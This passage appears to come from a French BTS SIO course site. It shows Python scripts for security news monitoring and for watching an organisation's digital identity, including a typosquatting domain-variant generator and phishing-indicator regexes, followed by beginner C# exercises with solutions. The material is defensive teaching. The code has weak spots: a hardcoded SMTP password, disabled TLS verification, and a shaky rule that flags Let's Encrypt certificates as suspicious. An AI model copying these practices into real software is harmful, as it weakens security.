r\u00e9cup\u00e9ration de {cve_id}: {e}\")\n\n        return None\n\n    def _calculate_severity(self, content: str, cve_ids: List[str]) -&gt; str:\n        \"\"\"Calculer la s\u00e9v\u00e9rit\u00e9 d'une alerte\"\"\"\n        high_severity_keywords = [\n            \"critical\", \"zero-day\", \"remote code execution\",\n            \"privilege escalation\", \"ransomware\", \"apt\"\n        ]\n\n        medium_severity_keywords = [\n            \"vulnerability\", \"exploit\", \"malware\", \"phishing\"\n        ]\n\n        # V\u00e9rifier les mots-cl\u00e9s haute s\u00e9v\u00e9rit\u00e9\n        for keyword in high_severity_keywords:\n            if keyword in content:\n                return \"HIGH\"\n\n        # V\u00e9rifier les CVE avec score CVSS \u00e9lev\u00e9\n        for cve_id in cve_ids:\n            cve_details = self.fetch_cve_details(cve_id)\n            if cve_details and cve_details.get('cvss', 0) &gt;= 7.0:\n                return \"HIGH\"\n\n        # V\u00e9rifier les mots-cl\u00e9s moyenne s\u00e9v\u00e9rit\u00e9\n        for keyword in medium_severity_keywords:\n            if keyword in content:\n                return \"MEDIUM\"\n\n        return \"LOW\"\n\n    def _extract_tags(self, content: str) -&gt; List[str]:\n        \"\"\"Extraire les tags d'une alerte\"\"\"\n        tags = []\n\n        tag_patterns = {\n            \"malware\": r\"\\b(malware|trojan|virus|worm|rootkit)\\b\",\n            \"ransomware\": r\"\\b(ransomware|crypto|locker)\\b\",\n            \"apt\": r\"\\b(apt|advanced persistent threat)\\b\",\n            \"ddos\": r\"\\b(ddos|denial of service)\\b\",\n            \"phishing\": r\"\\b(phishing|spear phishing|whaling)\\b\",\n            \"vulnerability\": r\"\\b(vulnerability|exploit|cve)\\b\",\n            \"data_breach\": r\"\\b(data breach|leak|exposure)\\b\"\n        }\n\n        for tag, pattern in tag_patterns.items():\n            if re.search(pattern, content, re.IGNORECASE):\n                tags.append(tag)\n\n        return tags\n\n    def store_alerts(self, alerts: List[SecurityAlert]):\n        \"\"\"Stocker les alertes en base de donn\u00e9es\"\"\"\n        conn = sqlite3.connect(self.db_path)\n        cursor = conn.cursor()\n\n        for alert in alerts:\n            try:\n                cursor.execute('''\n                    INSERT OR REPLACE INTO alerts \n                    (id, title, description, severity, source, published_date, \n                     cve_ids, affected_products, url, tags)\n                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)\n                ''', (\n                    alert.id,\n                    alert.title,\n                    alert.description,\n                    alert.severity,\n                    alert.source,\n                    alert.published_date.isoformat(),\n                    json.dumps(alert.cve_ids),\n                    json.dumps(alert.affected_products),\n                    alert.url,\n                    json.dumps(alert.tags)\n                ))\n\n                # Tracking des mots-cl\u00e9s\n                for keyword in self.keywords:\n                    content = (alert.title + \" \" + alert.description).lower()\n                    matches = len(re.findall(keyword, content, re.IGNORECASE))\n                    if matches &gt; 0:\n                        cursor.execute('''\n                            INSERT OR REPLACE INTO keywords_tracking \n                            (keyword, alert_id, matches)\n                            VALUES (?, ?, ?)\n                        ''', (keyword, alert.id, matches))\n\n            except Exception as e:\n                print(f\"[-] Erreur lors du stockage de l'alerte {alert.id}: {e}\")\n\n        conn.commit()\n        conn.close()\n\n    def get_recent_alerts(self, hours: int = 24, severity: str = None) -&gt; List[Dict]:\n        \"\"\"R\u00e9cup\u00e9rer les alertes r\u00e9centes\"\"\"\n        conn = sqlite3.connect(self.db_path)\n        cursor = conn.cursor()\n\n        since_date = (datetime.now() - timedelta(hours=hours)).isoformat()\n\n        query = '''\n            SELECT * FROM alerts \n            WHERE published_date &gt;= ?\n        '''\n        params = [since_date]\n\n        if severity:\n            query += ' AND severity = ?'\n            params.append(severity)\n\n        query += ' ORDER BY published_date DESC'\n\n        cursor.execute(query, params)\n        results = cursor.fetchall()\n\n        conn.close()\n\n        # Convertir en dictionnaires\n        columns = [desc[0] for desc in cursor.description]\n        alerts = []\n        for row in results:\n            alert_dict = dict(zip(columns, row))\n            # D\u00e9s\u00e9rialiser les champs JSON\n            alert_dict['cve_ids'] = json.loads(alert_dict['cve_ids'])\n            alert_dict['affected_products'] = json.loads(alert_dict['affected_products'])\n            alert_dict['tags'] = json.loads(alert_dict['tags'])\n            alerts.append(alert_dict)\n\n        return alerts\n\n    def generate_daily_report(self) -&gt; str:\n        \"\"\"G\u00e9n\u00e9rer un rapport quotidien\"\"\"\n        high_alerts = self.get_recent_alerts(24, \"HIGH\")\n        medium_alerts = self.get_recent_alerts(24, \"MEDIUM\")\n\n        report = f\"\"\"\nRAPPORT QUOTIDIEN DE VEILLE S\u00c9CURIT\u00c9\n=====================================\nDate: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\nALERTES HAUTE S\u00c9V\u00c9RIT\u00c9 ({len(high_alerts)})\n{'-' * 40}\n\"\"\"\n\n        for alert in high_alerts[:10]:  # Top 10\n            report += f\"\"\"\n\u2022 {alert['title']}\n  Source: {alert['source']}\n  CVE: {', '.join(alert['cve_ids']) if alert['cve_ids'] else 'N/A'}\n  Produits: {', '.join(alert['affected_products']) if alert['affected_products'] else 'N/A'}\n  URL: {alert['url']}\n\"\"\"\n\n        report += f\"\"\"\n\nALERTES MOYENNE S\u00c9V\u00c9RIT\u00c9 ({len(medium_alerts)})\n{'-' * 40}\n\"\"\"\n\n        for alert in medium_alerts[:5]:  # Top 5\n            report += f\"\"\"\n\u2022 {alert['title']}\n  Source: {alert['source']}\n  URL: {alert['url']}\n\"\"\"\n\n        # Statistiques\n        conn = sqlite3.connect(self.db_path)\n        cursor = conn.cursor()\n\n        cursor.execute('''\n            SELECT keyword, SUM(matches) as total_matches\n            FROM keywords_tracking kt\n            JOIN alerts a ON kt.alert_id = a.id\n            WHERE a.published_date &gt;= ?\n            GROUP BY keyword\n            ORDER BY total_matches DESC\n            LIMIT 10\n        ''', [(datetime.now() - timedelta(hours=24)).isoformat()])\n\n        keyword_stats = cursor.fetchall()\n        conn.close()\n\n        report += f\"\"\"\n\nMOTS-CL\u00c9S LES PLUS FR\u00c9QUENTS\n{'-' * 30}\n\"\"\"\n\n        for keyword, count in keyword_stats:\n            report += f\"\u2022 {keyword}: {count} mentions\\n\"\n\n        return report\n\n    def send_email_alert(self, subject: str, content: str, recipients: List[str]):\n        \"\"\"Envoyer une alerte par email\"\"\"\n        # Configuration SMTP (\u00e0 adapter)\n        smtp_server = \"smtp.example.com\"\n        smtp_port = 587\n        smtp_user = \"security-watch@example.com\"\n        smtp_password = \"password\"\n\n        try:\n            msg = MimeMultipart()\n            msg['From'] = smtp_user\n            msg['To'] = ', '.join(recipients)\n            msg['Subject'] = subject\n\n            msg.attach(MimeText(content, 'plain', 'utf-8'))\n\n            server = smtplib.SMTP(smtp_server, smtp_port)\n            server.starttls()\n            server.login(smtp_user, smtp_password)\n            server.send_message(msg)\n            server.quit()\n\n            print(f\"[+] Email envoy\u00e9 \u00e0 {', '.join(recipients)}\")\n\n        except Exception as e:\n            print(f\"[-] Erreur lors de l'envoi de l'email: {e}\")\n\n    def run_watch_cycle(self):\n        \"\"\"Ex\u00e9cuter un cycle de veille complet\"\"\"\n        print(f\"[+] D\u00e9marrage du cycle de veille - {datetime.now()}\")\n\n        # R\u00e9cup\u00e9rer les nouvelles alertes\n        alerts = self.fetch_rss_feeds()\n        print(f\"[+] {len(alerts)} alertes r\u00e9cup\u00e9r\u00e9es\")\n\n        # Stocker en base\n        self.store_alerts(alerts)\n\n        # V\u00e9rifier les alertes critiques\n        critical_alerts = [a for a in alerts if a.severity == \"HIGH\"]\n\n        if critical_alerts:\n            print(f\"[!] {len(critical_alerts)} alertes critiques d\u00e9tect\u00e9es\")\n\n            # Envoyer une notification imm\u00e9diate\n            alert_summary = \"\\n\".join([f\"\u2022 {a.title} ({a.source})\" for a in critical_alerts[:5]])\n            self.send_email_alert(\n                f\"ALERTE S\u00c9CURIT\u00c9 CRITIQUE - {len(critical_alerts)} nouvelles menaces\",\n                f\"Nouvelles alertes critiques d\u00e9tect\u00e9es:\\n\\n{alert_summary}\",\n                [\"admin@example.com\", \"security@example.com\"]\n            )\n\n        print(f\"[+] Cycle de veille termin\u00e9\")\n\n# Exemple d'utilisation\nif __name__ == \"__main__\":\n    # Initialisation du syst\u00e8me de veille\n    watchdog = SecurityWatchdog()\n\n    # Ex\u00e9cution d'un cycle de veille\n    watchdog.run_watch_cycle()\n\n    # G\u00e9n\u00e9ration du rapport quotidien\n    daily_report = watchdog.generate_daily_report()\n    print(daily_report)\n\n    # Programmation automatique (exemple avec cron)\n    # 0 */6 * * * /usr/bin/python3 /path/to/security_watch.py\n</code></pre> Identit\u00e9 num\u00e9rique  Ensemble des informations et traces num\u00e9riques qu'une organisation laisse sur Internet, volontairement ou involontairement, qui constituent sa repr\u00e9sentation virtuelle et influencent sa r\u00e9putation.  Composantes de l'identit\u00e9 num\u00e9rique \ud83c\udf10 Pr\u00e9sence officielle <ul> <li>Sites web : Site corporate, portails clients, intranets</li> <li>R\u00e9seaux sociaux : Comptes officiels, pages entreprise</li> <li>Domaines : Noms de domaine principaux et variantes</li> <li>Certificats : SSL/TLS, signatures num\u00e9riques</li> </ul> \ud83d\udc65 Pr\u00e9sence des collaborateurs <ul> <li>Profils professionnels : LinkedIn, r\u00e9seaux m\u00e9tier</li> <li>Publications : Articles, conf\u00e9rences, brevets</li> <li>R\u00e9seaux personnels : Traces involontaires</li> <li>Fuites d'information : Donn\u00e9es expos\u00e9es</li> </ul> \ud83d\udd0d Traces techniques <ul> <li>Infrastructure : Adresses IP, serveurs, services</li> <li>M\u00e9tadonn\u00e9es : Documents, images, emails</li> <li>Logs publics : Certificats CT, DNS, WHOIS</li> <li>Vuln\u00e9rabilit\u00e9s : Expositions de s\u00e9curit\u00e9</li> </ul> \ud83d\udcf0 R\u00e9putation externe <ul> <li>M\u00e9dias : Articles de presse, communiqu\u00e9s</li> <li>Avis clients : Plateformes d'\u00e9valuation</li> <li>Forums : Discussions, retours d'exp\u00e9rience</li> <li>Incidents : Breaches, pannes, controverses</li> </ul> Menaces sur l'identit\u00e9 num\u00e9rique Menace Description Impact Mesures de protection Typosquatting Enregistrement de domaines similaires Phishing, d\u00e9tournement de trafic Surveillance des domaines, enregistrement pr\u00e9ventif Usurpation d'identit\u00e9 Cr\u00e9ation de faux comptes/sites Atteinte \u00e0 la r\u00e9putation, fraude Monitoring des r\u00e9seaux sociaux, signalement D\u00e9facement Modification malveillante du site Image d\u00e9grad\u00e9e, perte de confiance S\u00e9curisation web, sauvegdes, monitoring Fuite de donn\u00e9es Exposition d'informations sensibles Sanctions RGPD, perte de clients Chiffrement, contr\u00f4les d'acc\u00e8s, DLP Campagne de d\u00e9sinformation Diffusion de fausses informations R\u00e9putation ternie, boycott Veille r\u00e9putation, communication de crise Social engineering Manipulation des collaborateurs Acc\u00e8s non autoris\u00e9, vol d'informations Formation, sensibilisation, proc\u00e9dures Strat\u00e9gie de protection de l'identit\u00e9 num\u00e9rique \ud83d\udd0d Audit de l'identit\u00e9 num\u00e9rique <ul> <li>Cartographie : Inventaire de tous les actifs num\u00e9riques</li> <li>Recherche OSINT : Informations publiquement disponibles</li> <li>Analyse des risques : Vuln\u00e9rabilit\u00e9s et expositions</li> <li>Benchmark concurrentiel : Comparaison sectorielle</li> </ul> \ud83d\udee1\ufe0f Mesures de protection <ul> <li>Enregistrement d\u00e9fensif : Domaines variantes et typos</li> <li>Monitoring continu : Surveillance automatis\u00e9e</li> <li>Authentification forte : 2FA sur tous les comptes</li> <li>Charte d'usage : Guidelines pour les collaborateurs</li> </ul> \ud83d\udcf1 Gestion des r\u00e9seaux sociaux <ul> <li>Politique social media : R\u00e8gles de publication</li> <li>Comptes officiels : Certification et s\u00e9curisation</li> <li>Mod\u00e9ration : Gestion des commentaires et interactions</li> <li>Crise communication : Proc\u00e9dures de r\u00e9ponse rapide</li> </ul> \u26a1 Gestion de crise <ul> <li>Plan de communication : Messages pr\u00e9-r\u00e9dig\u00e9s</li> <li>Cellule de crise : \u00c9quipe d\u00e9di\u00e9e et form\u00e9e</li> <li>Canaux de communication : M\u00e9dias, r\u00e9seaux, site web</li> <li>Suivi post-crise : Analyse et am\u00e9lioration</li> </ul> Outils de monitoring de l'identit\u00e9 num\u00e9rique Script de surveillance de l'identit\u00e9 num\u00e9rique <pre><code>#!/usr/bin/env python3\n\"\"\"\nSyst\u00e8me de surveillance de l'identit\u00e9 num\u00e9rique\nMonitoring automatis\u00e9 de la pr\u00e9sence en ligne\n\"\"\"\n\nimport requests\nimport dns.resolver\nimport whois\nimport ssl\nimport socket\nfrom urllib.parse import urlparse\nimport re\nfrom datetime import datetime, timedelta\nimport json\nfrom typing import List, Dict, Optional\nimport hashlib\n\nclass DigitalIdentityMonitor:\n    \"\"\"Surveillance de l'identit\u00e9 num\u00e9rique\"\"\"\n\n    def __init__(self, organization_name: str, primary_domain: str):\n        self.organization_name = organization_name\n        self.primary_domain = primary_domain\n        self.monitored_domains = []\n        self.social_accounts = {}\n        self.monitoring_results = {}\n\n    def add_domain_variants(self):\n        \"\"\"G\u00e9n\u00e9rer les variantes de domaine \u00e0 surveiller\"\"\"\n        base_domain = self.primary_domain.split('.')[0]\n        tlds = ['.com', '.fr', '.org', '.net', '.eu', '.info']\n\n        # Variantes communes\n        variants = [\n            base_domain,\n            base_domain + 's',\n            base_domain.replace('-', ''),\n            base_domain.replace('_', ''),\n            'www' + base_domain,\n            base_domain + 'official'\n        ]\n\n        # Typosquatting commun\n        typos = []\n        for i, char in enumerate(base_domain):\n            # Caract\u00e8res adjacents sur clavier QWERTY\n            adjacent_chars = {\n                'a': 'qwsz', 'b': 'vghn', 'c': 'xdfv', 'd': 'erfcxs',\n                'e': 'wrdsf', 'f': 'rtgvcd', 'g': 'tyhbvf', 'h': 'yujnbg',\n                'i': 'ujklo', 'j': 'ikmnhu', 'k': 'olmji', 'l': 'pko',\n                'm': 'njk', 'n': 'bhjm', 'o': 'iklp', 'p': 'ol',\n                'q': 'wa', 'r': 'etdf', 's': 'awedxz', 't': 'ryfg',\n                'u': 'yihj', 'v': 'cfgb', 'w': 'qase', 'x': 'zsdc',\n                'y': 'tugh', 'z': 'asx'\n            }\n\n            if char in adjacent_chars:\n                for adj_char in adjacent_chars[char]:\n                    typo = base_domain[:i] + adj_char + base_domain[i+1:]\n                    typos.append(typo)\n\n        # Combiner variantes et TLDs\n        for variant in variants + typos:\n            for tld in tlds:\n                self.monitored_domains.append(variant + tld)\n\n    def check_domain_registration(self, domain: str) -&gt; Dict:\n        \"\"\"V\u00e9rifier l'enregistrement d'un domaine\"\"\"\n        result = {\n            'domain': domain,\n            'registered': False,\n            'registrar': None,\n            'creation_date': None,\n            'expiration_date': None,\n            'nameservers': [],\n            'suspicious': False\n        }\n\n        try:\n            # V\u00e9rification WHOIS\n            domain_info = whois.whois(domain)\n\n            if domain_info.domain_name:\n                result['registered'] = True\n                result['registrar'] = domain_info.registrar\n                result['creation_date'] = domain_info.creation_date\n                result['expiration_date'] = domain_info.expiration_date\n                result['nameservers'] = domain_info.name_servers or []\n\n                # D\u00e9tection de domaines suspects\n                if domain != self.primary_domain:\n                    # Domaine r\u00e9cemment enregistr\u00e9\n                    if isinstance(domain_info.creation_date, datetime):\n                        days_old = (datetime.now() - domain_info.creation_date).days\n                        if days_old &lt; 30:\n                            result['suspicious'] = True\n\n                    # Registrar diff\u00e9rent\n                    primary_whois = whois.whois(self.primary_domain)\n                    if (primary_whois.registrar and \n                        domain_info.registrar != primary_whois.registrar):\n                        result['suspicious'] = True\n\n        except Exception as e:\n            print(f\"Erreur WHOIS pour {domain}: {e}\")\n\n        return result\n\n    def check_ssl_certificate(self, domain: str) -&gt; Dict:\n        \"\"\"V\u00e9rifier le certificat SSL d'un domaine\"\"\"\n        result = {\n            'domain': domain,\n            'has_ssl': False,\n            'issuer': None,\n            'subject': None,\n            'expiration_date': None,\n            'san_domains': [],\n            'suspicious': False\n        }\n\n        try:\n            context = ssl.create_default_context()\n            with socket.create_connection((domain, 443), timeout=10) as sock:\n                with context.wrap_socket(sock, server_hostname=domain) as ssock:\n                    cert = ssock.getpeercert()\n\n                    result['has_ssl'] = True\n                    result['issuer'] = dict(x[0] for x in cert['issuer'])\n                    result['subject'] = dict(x[0] for x in cert['subject'])\n\n                    # Date d'expiration\n                    exp_date = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')\n                    result['expiration_date'] = exp_date\n\n                    # SAN (Subject Alternative Names)\n                    if 'subjectAltName' in cert:\n                        result['san_domains'] = [name[1] for name in cert['subjectAltName']]\n\n                    # D\u00e9tection de certificats suspects\n                    if domain != self.primary_domain:\n                        # Certificat auto-sign\u00e9 ou \u00e9metteur suspect\n                        issuer_cn = result['issuer'].get('commonName', '').lower()\n                        if 'let\\'s encrypt' in issuer_cn or 'self-signed' in issuer_cn:\n                            result['suspicious'] = True\n\n        except Exception as e:\n            print(f\"Erreur SSL pour {domain}: {e}\")\n\n        return result\n\n    def check_website_content(self, domain: str) -&gt; Dict:\n        \"\"\"Analyser le contenu d'un site web\"\"\"\n        result = {\n            'domain': domain,\n            'accessible': False,\n            'title': None,\n            'description': None,\n            'keywords': [],\n            'organization_mentioned': False,\n            'suspicious_content': False,\n            'phishing_indicators': []\n        }\n\n        try:\n            response = requests.get(f\"https://{domain}\", timeout=10, \n                                  allow_redirects=True, verify=False)\n\n            if response.status_code == 200:\n                result['accessible'] = True\n                content = response.text.lower()\n\n                # Extraction des m\u00e9tadonn\u00e9es\n                title_match = re.search(r'&lt;title&gt;(.*?)&lt;/title&gt;', content, re.IGNORECASE)\n                if title_match:\n                    result['title'] = title_match.group(1).strip()\n\n                desc_match = re.search(r'&lt;meta[^&gt;]*name=[\"\\']description[\"\\'][^&gt;]*content=[\"\\']([^\"\\']*)[\"\\']', \n                                     content, re.IGNORECASE)\n                if desc_match:\n                    result['description'] = desc_match.group(1).strip()\n\n                # V\u00e9rification de la mention de l'organisation\n                org_variations = [\n                    self.organization_name.lower(),\n                    self.organization_name.lower().replace(' ', ''),\n                    self.organization_name.lower().replace('-', ''),\n                ]\n\n                for variation in org_variations:\n                    if variation in content:\n                        result['organization_mentioned'] = True\n                        break\n\n                # D\u00e9tection d'indicateurs de phishing\n                phishing_patterns = [\n                    r'urgent.*action.*required',\n                    r'verify.*account.*immediately',\n                    r'suspended.*account',\n                    r'click.*here.*now',\n                    r'limited.*time.*offer',\n                    r'congratulations.*winner'\n                ]\n\n                for pattern in phishing_patterns:\n                    if re.search(pattern, content, re.IGNORECASE):\n                        result['phishing_indicators'].append(pattern)\n                        result['suspicious_content'] = True\n\n        except Exception as e:\n            print(f\"Erreur d'acc\u00e8s web pour {domain}: {e}\")\n\n        return result\n\n    def search_social_media_mentions(self, platform: str, query: str) -&gt; List[Dict]:\n        \"\"\"Rechercher des mentions sur les r\u00e9seaux sociaux\"\"\"\n        # Note: N\u00e9cessite des APIs sp\u00e9cifiques pour chaque plateforme\n        # Ceci est un exemple conceptuel\n\n        mentions = []\n\n        # Simulation de recherche (\u00e0 remplacer par de vraies APIs)\n        if platform == \"twitter\":\n            # API Twitter v2\n            pass\n        elif platform == \"facebook\":\n            # Graph API Facebook\n            pass\n        elif platform == \"linkedin\":\n            # LinkedIn API\n            pass\n\n        return mentions\n\n    def generate_monitoring_report(self) -&gt; Dict:\n        \"\"\"G\u00e9n\u00e9rer un rapport de surveillance\"\"\"\n        report = {\n            'organization': self.organization_name,\n            'primary_domain': self.primary_domain,\n            'scan_date': datetime.now().isoformat(),\n            'summary': {\n                'total_domains_checked': len(self.monitored_domains),\n                'suspicious_domains': 0,\n                'ssl_issues': 0,\n                'phishing_attempts': 0\n            },\n            'findings': {\n                'domain_registrations': [],\n                'ssl_certificates': [],\n                'website_content': [],\n                'social_mentions': []\n            },\n            'recommendations': []\n        }\n\n        # Analyser tous les domaines surveill\u00e9s\n        for domain in self.monitored_domains:\n            # V\u00e9rification d'enregistrement\n            domain_info = self.check_domain_registration(domain)\n            if domain_info['registered']:\n                report['findings']['domain_registrations'].append(domain_info)\n\n                if domain_info['suspicious']:\n                    report['summary']['suspicious_domains'] += 1\n\n                # V\u00e9rification SSL\n                ssl_info = self.check_ssl_certificate(domain)\n                report['findings']['ssl_certificates'].append(ssl_info)\n\n                if ssl_info['suspicious']:\n                    report['summary']['ssl_issues'] += 1\n\n                # Analyse du contenu\n                content_info = self.check_website_content(domain)\n                report['findings']['website_content'].append(content_info)\n\n                if content_info['suspicious_content']:\n                    report['summary']['phishing_attempts'] += 1\n\n        # G\u00e9n\u00e9rer des recommandations\n        if report['summary']['suspicious_domains'] &gt; 0:\n            report['recommendations'].append(\n                \"Surveiller de pr\u00e8s les domaines suspects identifi\u00e9s\"\n            )\n\n        if report['summary']['ssl_issues'] &gt; 0:\n            report['recommendations'].append(\n                \"V\u00e9rifier les certificats SSL suspects\"\n            )\n\n        if report['summary']['phishing_attempts'] &gt; 0:\n            report['recommendations'].append(\n                \"Signaler les tentatives de phishing aux autorit\u00e9s\"\n            )\n\n        return report\n\n    def run_full_scan(self) -&gt; Dict:\n        \"\"\"Ex\u00e9cuter une analyse compl\u00e8te\"\"\"\n        print(f\"[+] D\u00e9marrage de l'analyse pour {self.organization_name}\")\n\n        # G\u00e9n\u00e9rer les variantes de domaine\n        self.add_domain_variants()\n        print(f\"[+] {len(self.monitored_domains)} domaines \u00e0 surveiller\")\n\n        # G\u00e9n\u00e9rer le rapport\n        report = self.generate_monitoring_report()\n\n        print(f\"[+] Analyse termin\u00e9e:\")\n        print(f\"    - Domaines suspects: {report['summary']['suspicious_domains']}\")\n        print(f\"    - Probl\u00e8mes SSL: {report['summary']['ssl_issues']}\")\n        print(f\"    - Tentatives de phishing: {report['summary']['phishing_attempts']}\")\n\n        return report\n\n# Exemple d'utilisation\nif __name__ == \"__main__\":\n    # Configuration pour une organisation\n    monitor = DigitalIdentityMonitor(\"MonEntreprise\", \"monentreprise.com\")\n\n    # Ajout de comptes sociaux \u00e0 surveiller\n    monitor.social_accounts = {\n        \"twitter\": \"@monentreprise\",\n        \"linkedin\": \"company/monentreprise\",\n        \"facebook\": \"monentreprise\"\n    }\n\n    # Ex\u00e9cution de l'analyse\n    report = monitor.run_full_scan()\n\n    # Sauvegarde du rapport\n    with open(f\"identity_report_{datetime.now().strftime('%Y%m%d')}.json\", 'w') as f:\n        json.dump(report, f, indent=2, default=str, ensure_ascii=False)\n\n    print(\"\\n[+] Rapport sauvegard\u00e9\")\n</code></pre>"},{"location":"BTS/B2/B3_6_Conformite_veille_securite/#competences-bts-sio-bloc-b3","title":"\ud83c\udfaf Comp\u00e9tences BTS SIO - Bloc B3","text":"Correspondance avec le r\u00e9f\u00e9rentiel U7 : <ul> <li>B3.1-B3.2 : Prot\u00e9ger les donn\u00e9es \u00e0 caract\u00e8re personnel (RGPD)</li> <li>B3.3-B3.4 : Pr\u00e9server l'identit\u00e9 num\u00e9rique de l'organisation</li> <li>B3.5 : S\u00e9curiser les \u00e9quipements et les usages des utilisateurs</li> <li>B3.6 : Garantir la disponibilit\u00e9, l'int\u00e9grit\u00e9 et la confidentialit\u00e9 face aux cyberattaques</li> </ul>"},{"location":"BTS/B2/B3_6_Conformite_veille_securite/#ressources-et-references","title":"\ud83d\udcda Ressources et r\u00e9f\u00e9rences","text":"Documentation officielle <ul> <li>CNIL : Guide RGPD du d\u00e9veloppeur</li> <li>ANSSI : Guide d'hygi\u00e8ne informatique</li> <li>ISO : Norme ISO 27001:2022</li> <li>NIST : Cybersecurity Framework</li> </ul>"},{"location":"BTS/B2/B3_6_Conformite_veille_securite/#outils-pratiques","title":"Outils pratiques","text":"<ul> <li>RGPD : PIA CNIL, registre des traitements</li> <li>Veille : CERT-FR, CVE Details, NVD</li> <li>Monitoring : Google Alerts, Mention, Brand24</li> <li>Conformit\u00e9 : GRC tools, audit frameworks</li> </ul> \ud83d\udca1 Points cl\u00e9s \u00e0 retenir <ul> <li>La conformit\u00e9 RGPD est une obligation l\u00e9gale avec des sanctions importantes</li> <li>Les normes de s\u00e9curit\u00e9 fournissent un cadre structur\u00e9 pour la protection</li> <li>La veille s\u00e9curit\u00e9 doit \u00eatre automatis\u00e9e et continue</li> <li>L'identit\u00e9 num\u00e9rique n\u00e9cessite une surveillance proactive</li> <li>La gestion de crise doit \u00eatre pr\u00e9par\u00e9e et test\u00e9e r\u00e9guli\u00e8rement</li> </ul>"},{"location":"BTS/B2/Fiches_exercices/Exercices_bases_CSharp/","title":"Exercices C# - Les Bases\ud83c\udfaf Exercices C# - Les Bases","text":"<p>         D\u00e9couvrez les fondamentaux du C# \u00e0 travers des exercices pratiques sur les variables, les types de donn\u00e9es et les op\u00e9rateurs.          Ces exercices vous permettront de ma\u00eetriser les concepts essentiels pour bien d\u00e9buter en programmation C#.     </p> \ud83c\udf31 Introduction \ud83d\udce6 Variables &amp; Types \u26a1 Op\u00e9rateurs \ud83d\ude80 Pratique \ud83c\udf31 Introduction \ud83c\udfaf Premier programme C# <p>Cr\u00e9ez votre premier programme C# qui affiche \"Hello, C#!\" dans la console.</p> <p>Utilisez la m\u00e9thode <code>Console.WriteLine()</code> pour afficher le message.</p> \ud83d\udca1 Voir la solution              <pre><code>using System;\n\nclass Program\n{\n    static void Main()\n    {\n        Console.WriteLine(\"Hello, C#!\");\n    }\n}</code></pre> \ud83c\udf31 Introduction \ud83d\udd22 Types de donn\u00e9es <p>Identifiez les types C# correspondant aux valeurs suivantes :</p> <ul> <li><code>42</code></li> <li><code>3.14</code></li> <li><code>\"Bonjour\"</code></li> <li><code>true</code></li> <li><code>'A'</code></li> </ul> \ud83d\udca1 Voir la solution              <pre><code>// 42 \u2192 int (entier)\n// 3.14 \u2192 double (nombre d\u00e9cimal)\n// \"Bonjour\" \u2192 string (cha\u00eene de caract\u00e8res)\n// true \u2192 bool (bool\u00e9en)\n// 'A' \u2192 char (caract\u00e8re)</code></pre> \ud83c\udf31 Introduction \ud83d\udcdd D\u00e9claration de variables <p>D\u00e9clarez et initialisez les variables suivantes :</p> <ul> <li>Une variable <code>age</code> de type entier avec la valeur 25</li> <li>Une variable <code>nom</code> de type string avec votre pr\u00e9nom</li> <li>Une variable <code>estEtudiant</code> de type bool\u00e9en avec la valeur true</li> </ul> \ud83d\udca1 Voir la solution              <pre><code>int age = 25;\nstring nom = \"Alice\";\nbool estEtudiant = true;</code></pre> \u2b50 Facile \ud83d\udd04 \u00c9change de variables <p>\u00c9crivez un programme qui \u00e9change les valeurs de deux variables enti\u00e8res.</p> <p>D\u00e9clarez deux variables <code>a = 10</code> et <code>b = 20</code>, puis \u00e9changez leurs valeurs et affichez le r\u00e9sultat.</p> \ud83d\udca1 Voir la solution              <pre><code>using System;\n\nclass Program\n{\n    static void Main()\n    {\n        int a = 10;\n        int b = 20;\n\n        Console.WriteLine($\"Avant \u00e9change: a = {a}, b = {b}\");\n\n        // \u00c9change avec variable temporaire\n        int temp = a;\n        a = b;\n        b = temp;\n\n        Console.WriteLine($\"Apr\u00e8s \u00e9change: a = {a}, b = {b}\");\n    }\n}</code></pre> \u2b50 Facile \ud83c\udf82 Calcul d'\u00e2ge <p>Cr\u00e9ez un programme qui calcule l'\u00e2ge d'une personne.</p> <p>D\u00e9clarez une variable pour l'ann\u00e9e de naissance (ex: 1995) et calculez l'\u00e2ge en 2024.</p> \ud83d\udca1 Voir la solution              <pre><code>using System;\n\nclass Program\n{\n    static void Main()\n    {\n        int anneeNaissance = 1995;\n        int anneeActuelle = 2024;\n        int age = anneeActuelle - anneeNaissance;\n\n        Console.WriteLine($\"Ann\u00e9e de naissance: {anneeNaissance}\");\n        Console.WriteLine($\"\u00c2ge en {anneeActuelle}: {age} ans\");\n    }\n}</code></pre> \ud83d\udd25 Interm\u00e9diaire \ud83d\udcb0 Conversion de devises <p>Cr\u00e9ez un convertisseur Euro vers Dollar.</p> <p>Utilisez un taux de change de 1.10 (1\u20ac = 1.10$). Convertissez 50\u20ac en dollars et affichez le r\u00e9sultat format\u00e9.</p> \ud83d\udca1 Voir la solution              <pre><code>using System;\n\nclass Program\n{\n    static void Main()\n    {\n        double euros = 50.0;\n        double tauxChange = 1.10;\n        double dollars = euros * tauxChange;\n\n        Console.WriteLine($\"{euros:F2}\u20ac = {dollars:F2}$\");\n        Console.WriteLine($\"Taux de change utilis\u00e9: {tauxChange}\");\n    }\n}</code></pre> \u2b50 Facile \ud83e\uddee Calculatrice simple <p>Cr\u00e9ez une calculatrice qui effectue les 4 op\u00e9rations de base.</p> <p>Utilisez deux nombres (ex: 15 et 4) et affichez le r\u00e9sultat de l'addition, soustraction, multiplication et division.</p> \ud83d\udca1 Voir la solution              <pre><code>using System;\n\nclass Program\n{\n    static void Main()\n    {\n        int a = 15;\n        int b = 4;\n\n        Console.WriteLine($\"Nombres: {a} et {b}\");\n        Console.WriteLine($\"Addition: {a} + {b} = {a + b}\");\n        Console.WriteLine($\"Soustraction: {a} - {b} = {a - b}\");\n        Console.WriteLine($\"Multiplication: {a} * {b} = {a * b}\");\n        Console.WriteLine($\"Division: {a} / {b} = {(double)a / b:F2}\");\n        Console.WriteLine($\"Modulo: {a} % {b} = {a % b}\");\n    }\n}</code></pre> \ud83d\udd25 Interm\u00e9diaire \ud83d\udd22 Op\u00e9rateurs logiques <p>Testez les op\u00e9rateurs logiques avec des variables bool\u00e9ennes.</p> <p>Cr\u00e9ez deux variables bool\u00e9ennes et testez les op\u00e9rateurs <code>&amp;&amp;</code>, <code>||</code> et <code>!</code>.</p> \ud83d\udca1 Voir la solution              <pre><code>using System;\n\nclass Program\n{\n    static void Main()\n    {\n        bool a = true;\n        bool b = false;\n\n        Console.WriteLine($\"a = {a}, b = {b}\");\n        Console.WriteLine($\"a &amp;&amp; b = {a &amp;&amp; b}\");  // ET logique\n        